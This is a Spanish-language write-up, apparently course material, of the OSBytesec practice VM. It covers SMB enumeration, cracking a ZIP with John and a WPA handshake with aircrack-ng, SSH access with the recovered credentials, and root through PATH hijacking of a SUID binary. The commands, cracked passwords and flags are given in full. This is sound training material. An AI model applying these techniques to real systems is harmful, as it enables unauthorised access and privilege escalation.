---
title: "🖥️ Máquina: OSBytesec — Hacking Ético"
aliases:
  - OSBytesec
  - Máquina OSBytesec
  - VM OSBytesec
  - Writeup OSBytesec
tags:
  - ifct0109
  - hacking-etico
  - vms
  - linux
  - ctf
---

# 🖥️ Máquina: OSBytesec

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Dificultad:** Conceptos Básicos  
> **Técnicas trabajadas:** Enumeración SMB · rpcclient · Cracking de ZIP · Cracking de captura WiFi (aircrack-ng) · Acceso SSH · Escalada de privilegios (SUID + PATH Hijacking)  
> **Descripción:** En esta práctica enumeraremos un servicio Samba en profundidad usando múltiples herramientas, extraeremos credenciales desde un archivo de captura de red WiFi y escalaremos privilegios mediante la técnica de PATH Hijacking abusando de un binario SUID que llama a un comando usando una ruta relativa.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.44`
* **`RHOST` (Víctima / OSBytesec):** Ej. `10.0.0.45`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina OSBytesec tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Comenzamos con un escaneo completo de puertos TCP:

```bash
nmap -sT -p- 10.0.0.45
```

```text
PORT     STATE SERVICE
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2525/tcp open  ms-v-worlds
```

> [!info] Resultado
> El escaneo revela cuatro puertos abiertos. El puerto 2525 aparece como ms-v-worlds pero en realidad es SSH corriendo en un puerto no estándar, algo habitual para dificultar su detección. Los puertos 139 y 445 indican que hay un servicio Samba (SMB) activo.

Lanzamos un escaneo detallado sobre los puertos encontrados:

```bash
nmap -A -p80,139,445,2525 10.0.0.45
```

```text
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Hacker_James
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2525/tcp open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7

Host script results:
| nbstat: NetBIOS name: NITIN
| smb-security-mode:
|   account_used: guest
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: nitin
```

> [!info] Resultado
> Confirmamos los servicios. El nombre NetBIOS del equipo es NITIN. La firma de mensajes SMB está deshabilitada, lo que es una debilidad de configuración. El acceso como guest está permitido, lo que sugiere que podemos intentar acceso anónimo al SMB.

---

## 🌐 Fase 2: Enumeración web

Inspeccionamos la página web en busca de pistas:

```bash
curl http://10.0.0.45
```

```text
####################GET#####smb##############free
```

> [!info] Resultado
> La web muestra un mensaje directo que nos indica que debemos centrarnos en el servicio SMB y tratar de acceder de forma libre (anónima o con credenciales vacías).

---

## 📁 Fase 3: Enumeración SMB

Disponemos de varias herramientas para enumerar SMB. Las usaremos de forma progresiva para obtener la máxima información posible.

nmap con scripts específicos de SMB para obtener más detalles:

```bash
nmap -sC -sV -p139,445 10.0.0.45
```

smbmap permite ver rápidamente los recursos compartidos y los permisos que tenemos sobre ellos con sesión anónima:

```bash
smbmap -H 10.0.0.45
```

```text
[+] IP: 10.0.0.45:445	Name: 10.0.0.45           	Status: NULL Session
	Disk                       Permissions    Comment
	----                       -----------    -------
	print$                     NO ACCESS      Printer Drivers
	IPC$                       NO ACCESS      IPC Service (nitin server (Samba, Ubuntu))
```

> [!info] Resultado
> Con sesión nula solo vemos print$ e IPC$, ambos sin acceso. No hay recursos abiertos anónimamente por el momento.

netexec (sucesor de crackmapexec) nos da una visión rápida del servidor y sus recursos autenticándonos con usuario y contraseña vacíos:

```bash
netexec smb 10.0.0.45 --shares -u
```

```text
SMB  10.0.0.45  445  NITIN  [*] Unix - Samba (name:NITIN) (domain:168.1.7) (signing:False) (SMBv1:True)
SMB  10.0.0.45  445  NITIN  [+] 168.1.7\: (Guest)
SMB  10.0.0.45  445  NITIN  Share           Permissions     Remark
SMB  10.0.0.45  445  NITIN  -----           -----------     ------
SMB  10.0.0.45  445  NITIN  print$                          Printer Drivers
SMB  10.0.0.45  445  NITIN  IPC$                            IPC Service (nitin server (Samba, Ubuntu))
```

> [!info] Resultado
> Confirma que el servidor corre Samba con SMBv1 habilitado y que los recursos disponibles son print$ e IPC$. Ninguno con permisos asignados aún.

smbclient lista los recursos disponibles. Cuando pida contraseña, pulsamos Enter para dejarla vacía:

```bash
smbclient -L 10.0.0.45
```

```text
Password for [WORKGROUP\tecnico]: (Enter)

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (nitin server (Samba, Ubuntu))

	Workgroup            Master
	---------            -------
	WORKGROUP            NITIN
```

> [!info] Resultado
> Mismos recursos que antes. El servidor se identifica como maestro del grupo de trabajo WORKGROUP.

rpcclient es una herramienta de bajo nivel que permite interactuar con el servicio RPC de Samba y extraer información detallada del servidor, sus dominios, recursos y usuarios. Nos conectamos con sesión nula:

```bash
rpcclient -U
```

Una vez dentro disponemos de los siguientes comandos de enumeración:

```bash
rpcclient $> srvinfo
```

```text
NITIN          Wk Sv PrQ Unx NT SNT nitin server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03
```

> [!info] Resultado
> Información general del servidor: nombre NITIN, tipo Unix/Samba, versión de SO simulada como Windows 6.1 para compatibilidad. Confirma que es un servidor Samba sobre Ubuntu.

```bash
rpcclient $> enumdomains
```

```text
name:[NITIN] idx:[0x0]
name:[Builtin] idx:[0x1]
```

> [!info] Resultado
> Muestra dos dominios: NITIN (dominio local de la máquina) y Builtin (grupos integrados del sistema). Esto es lo habitual en una máquina standalone con Samba.

```bash
rpcclient $> querydominfo
```

```text
Domain:		WORKGROUP
Server:		NITIN
Comment:	nitin server (Samba, Ubuntu)
Total Users:	1
Total Groups:	0
Total Aliases:	0
Server Role:	ROLE_DOMAIN_PDC
```

> [!info] Resultado
> El servidor actúa como PDC (Primary Domain Controller) y tiene registrado 1 usuario en el dominio RPC. Este contador solo refleja los usuarios Samba, no todos los usuarios Unix del sistema. Más adelante con enum4linux encontraremos más.

```bash
rpcclient $> netshareenumall
```

```text
netname: print$
	remark:	Printer Drivers
	path:	C:\var\lib\samba\printers
	password:	
netname: IPC$
	remark:	IPC Service (nitin server (Samba, Ubuntu))
	path:	C:\tmp
	password:
```

> [!info] Resultado
> Lista los recursos compartidos con sus rutas físicas reales en el servidor. Vemos que print$ apunta a /var/lib/samba/printers e IPC$ a /tmp. No vemos ningún recurso personalizado todavía.

```bash
rpcclient $> netsharegetinfo print$
```

```text
netname: print$
	remark:	Printer Drivers
	path:	C:\var\lib\samba\printers
	type:	0x0
	perms:	0
	max_uses:	-1
	num_uses:	1
DACL
	ACE
		type: ACCESS ALLOWED (0) flags: 0x00 
		Permissions: 0x1f01ff: SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
		SID: S-1-1-0
```

> [!info] Resultado
> Detalla la configuración de seguridad del recurso print$. El SID S-1-1-0 corresponde al grupo Everyone (todos los usuarios). Sin embargo, los permisos efectivos dependen también de la configuración de Samba, que en este caso restringe la escritura.

```bash
rpcclient $> netsharegetinfo IPC$
```

```text
netname: IPC$
	remark:	IPC Service (nitin server (Samba, Ubuntu))
	path:	C:\tmp
	type:	0x80000003
	perms:	0
	max_uses:	-1
	num_uses:	1
DACL
	ACE
		type: ACCESS ALLOWED (0) flags: 0x00 
		Permissions: 0x1f01ff: SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
		SID: S-1-1-0
```

> [!info] Resultado
> Similar al anterior. El tipo 0x80000003 indica que es un recurso IPC especial. Su ruta real es /tmp, que es el directorio temporal del sistema.

```bash
rpcclient $> enumdomusers
```

```text
user:[smb] rid:[0x3e8]
```

> [!info] Resultado
> Encontramos un usuario registrado en el dominio Samba: smb con RID 0x3e8 (1000 en decimal). El RID es el identificador relativo que usa Samba para ese usuario dentro del dominio, distinto del UID Unix del sistema operativo. Usamos ese RID para obtener más información:

```bash
rpcclient $> queryuser 0x3e8
```

```text
User Name   :	smb
	Full Name   :	
	Home Drive  :	\\nitin\smb
	Dir Drive   :	
	Profile Path:	\\nitin\smb\profile
	Logon Script:	
	Description :	
	Logon Time               :	jue, 01 ene 1970 01:00:00 CET
	Password last set Time   :	lun, 04 nov 2019 12:38:50 CET
	user_rid :	0x3e8
	group_rid:	0x201
	acb_info :	0x00000010
```

> [!info] Resultado
> Información clave del usuario smb:
> · Home Drive: \\nitin\smb — su directorio home está compartido como recurso SMB llamado smb. Este recurso no aparecía en los listados anónimos, pero puede que sea accesible si nos autenticamos como este usuario.
> · Nunca ha iniciado sesión interactiva (fecha de logon es 1970), lo que sugiere que es una cuenta de servicio usada solo para SMB.
> · La contraseña se estableció en noviembre de 2019 y no ha cambiado.

Usamos enum4linux para una enumeración más amplia que incluye usuarios Unix del sistema, no solo los del dominio RPC:

```bash
enum4linux -A 10.0.0.45
```

```text
S-1-22-1-1000 Unix User\sagar (Local User)
S-1-22-1-1001 Unix User\blackjax (Local User)
S-1-22-1-1002 Unix User\smb (Local User)
```

> [!info] Resultado
> enum4linux revela tres usuarios Unix del sistema: sagar, blackjax y smb. Estos son los UIDs Unix reales del sistema operativo, independientes del RID que usa Samba internamente. Ahora tenemos tres posibles usuarios para intentar acceso. Nos centramos en smb ya que sabemos que tiene un recurso compartido en su home.

Probamos a acceder con el usuario smb y contraseña vacía para comprobar si tiene más permisos:

```bash
smbmap -u
```

```text
[+] IP: 10.0.0.45:445	Name: 10.0.0.45
	Disk                       Permissions    Comment
	----                       -----------    -------
	print$                     READ ONLY      Printer Drivers
	IPC$                       NO ACCESS      IPC Service (nitin server (Samba, Ubuntu))
```

> [!info] Resultado
> Con el usuario smb ahora tenemos acceso de lectura sobre print$. Sin embargo el recurso smb que vimos en el queryuser no aparece aquí. Lo intentamos directamente con smbclient:

```bash
smbclient -L 10.0.0.45 -U smb
```

```text
Password for [WORKGROUP\smb]: (Enter)

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (nitin server (Samba, Ubuntu))

	WORKGROUP            NITIN
```

Creamos un archivo de prueba para intentar subir algo al servidor:

```bash
echo "prueba" > hola.txt
```

Intentamos conectar al recurso print$ y subir el archivo:

```bash
smbclient //10.0.0.45/print$ -U smb
```

```text
Password for [WORKGROUP\smb]: (Enter)
smb: \> ls
  .                                   D        0  ...
  ..                                  D        0  ...
  W32X86                              D        0  ...
smb: \> cd W32X86\
smb: \W32X86\> put hola.txt
NT_STATUS_ACCESS_DENIED opening remote file \W32X86\hola.txt
```

> [!info] Resultado
> Tenemos acceso de lectura al recurso print$ y podemos ver los drivers, pero no podemos escribir. Probamos ahora con el recurso smb que descubrimos en el campo Home Drive del queryuser:

```bash
smbclient //10.0.0.45/smb -U smb
```

```text
Password for [WORKGROUP\smb]: (Enter)
smb: \> ls
  .                                   D        0  Mon Nov  4 12:50:37 2019
  ..                                  D        0  Mon Nov  4 12:37:28 2019
  main.txt                            N       10  Mon Nov  4 12:45:38 2019
  safe.zip                            N  3424907  Mon Nov  4 12:50:37 2019
```

> [!info] Resultado
> Acceso exitoso al recurso smb. Encontramos dos archivos: main.txt y safe.zip (~3.4 MB). Los descargamos:

```bash
smb: \> get main.txt
smb: \> get safe.zip
```

---

## 🔓 Fase 4: Cracking del ZIP y análisis de la captura WiFi

El archivo safe.zip está protegido con contraseña. Usamos zip2john para extraer el hash de la contraseña en un formato que John the Ripper pueda procesar:

```bash
zip2john safe.zip > hash_safe.txt
```

Crackeamos el hash con John the Ripper usando el diccionario rockyou:

```bash
john hash_safe.txt -w=/usr/share/wordlists/rockyou.txt
```

```text
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
hacker1          (safe.zip)
```

> [!info] Resultado
> John encuentra la contraseña del ZIP: hacker1

Descomprimimos el ZIP con la contraseña obtenida:

```bash
unzip safe.zip
```

```text
Archive:  safe.zip
[safe.zip] secret.jpg password: hacker1
  inflating: secret.jpg              
  inflating: user.cap
```

> [!info] Resultado
> El ZIP contiene dos archivos: secret.jpg y user.cap.
> Los archivos .cap son capturas de paquetes de red. En el contexto WiFi, pueden contener handshakes WPA: los paquetes intercambiados durante la autenticación a una red inalámbrica. Si capturamos un handshake podemos intentar crackearlo offline para obtener la contraseña de la red.

Analizamos el archivo de captura con aircrack-ng para ver qué contiene:

```bash
aircrack-ng user.cap
```

```text
Reading packets, please wait...
Opening user.cap
Read 49683 packets.

   #  BSSID              ESSID                     Encryption
   1  56:DC:1D:19:52:BC  blackjax                  WPA (1 handshake)
```

> [!info] Resultado
> La captura contiene un handshake WPA de la red con ESSID blackjax. Este nombre coincide exactamente con uno de los usuarios del sistema que encontramos con enum4linux. Es muy probable que la contraseña de la WiFi sea también la contraseña SSH del usuario blackjax.

Crackeamos el handshake WPA usando rockyou:

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt user.cap
```

```text
KEY FOUND! [ snowflake ]
```

> [!info] Resultado
> Contraseña encontrada: snowflake
> Tenemos las credenciales del usuario blackjax: blackjax:snowflake

---

## 🔑 Fase 5: Acceso SSH y flag de usuario

El SSH está corriendo en el puerto no estándar 2525. Usamos el parámetro -p para especificarlo:

```bash
ssh blackjax@10.0.0.45 -p 2525
```

```text
# Contraseña: snowflake
```

Una vez dentro ejecutamos bash para obtener una shell interactiva completa con historial y autocompletado:

```bash
bash
```

```bash
id
```

```text
uid=1001(blackjax) gid=1001(blackjax) groups=1001(blackjax)
```

```bash
ls -la
```

```text
total 12
drwxr-xr-x 2 root root 4096 Nov  4  2019 .
drwxr-xr-x 5 root root 4096 Nov  4  2019 ..
-rw-r--r-- 1 root root  586 Nov  4  2019 user.txt
```

```bash
cat user.txt
```

```text
_    _  _____ ______ _____        ______ _               _____ 
 | |  | |/ ____|  ____|  __ \      |  ____| |        /\   / ____|
 | |  | | (___ | |__  | |__) |_____| |__  | |       /  \ | |  __ 
 | |  | |\___ \|  __| |  _  /______|  __| | |      / /\ \| | |_ |
 | |__| |____) | |____| | \ \      | |    | |____ / ____ \ |__| |
  \____/|_____/|______|_|  \_\     |_|    |______/_/    \_\_____|

Go To Root.
MD5-HASH : f589a6959f3e04037eb2b3eb0ff726ac
```

> [!info] Resultado
> Flag de usuario obtenida: MD5: f589a6959f3e04037eb2b3eb0ff726ac

---

## 🚀 Fase 6: Escalada de privilegios — PATH Hijacking

Buscamos binarios con el bit SUID activo:

```bash
find / -perm -u=s -type f 2>/dev/null
```

> [!info] Resultado
> Entre los resultados encontramos /usr/bin/netscan, un binario no estándar. Al ejecutarlo se comporta como netstat. Inspeccionamos sus cadenas internas con strings para ver qué comandos ejecuta:

```bash
strings /usr/bin/netscan
```

```text
netstat -antp
```

> [!info] Resultado
> El binario llama a netstat usando una ruta relativa (sin especificar la ruta completa como /bin/netstat). Esto es crítico: cuando un programa usa rutas relativas, el sistema busca el ejecutable recorriendo los directorios de la variable PATH en orden. Si conseguimos que nuestro directorio aparezca primero en el PATH, el sistema ejecutará nuestro archivo en lugar del original. Como netscan tiene SUID de root, cualquier comando que lance heredará esos privilegios. Esta técnica se llama PATH Hijacking.

El ataque consiste en tres pasos. Primero creamos en /tmp un archivo llamado netstat que lanza una shell bash, y le damos permisos de ejecución:

```bash
cd /tmp
echo "/bin/bash" > netstat
chmod +x netstat
```

Comprobamos el PATH actual y añadimos /tmp al principio para que tenga prioridad:

```bash
echo $PATH
```

```text
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

```bash
export PATH=/tmp:$PATH
```

> [!info] Resultado
> Ahora cuando el sistema busque netstat, encontrará primero /tmp/netstat (nuestro archivo malicioso) antes que el netstat real en /bin/.

Ejecutamos el binario SUID. Al llamar a netstat sin ruta absoluta, el sistema ejecutará nuestro /tmp/netstat con privilegios de root:

```bash
/usr/bin/netscan
```

```text
root@nitin:/tmp#
```

> [!info] Resultado
> Obtenemos una shell como root.

```bash
cd /root
cat root.txt
```

```text
____  ____  ____  ______   ________    ___   ______
   / __ \/ __ \/ __ \/_  __/  / ____/ /   /   | / ____/
  / /_/ / / / / / / / / /    / /_  / /   / /| |/ / __  
 / _, _/ /_/ / /_/ / / /    / __/ / /___/ ___ / /_/ /  
/_/ |_|\____/\____/ /_/____/_/   /_____/_/  |_\____/   
                     /_____/                           
Conguratulation..

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
```

> [!info] Resultado
> Flag de root obtenida: MD5: bae11ce4f67af91fa58576c1da2aad4b

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
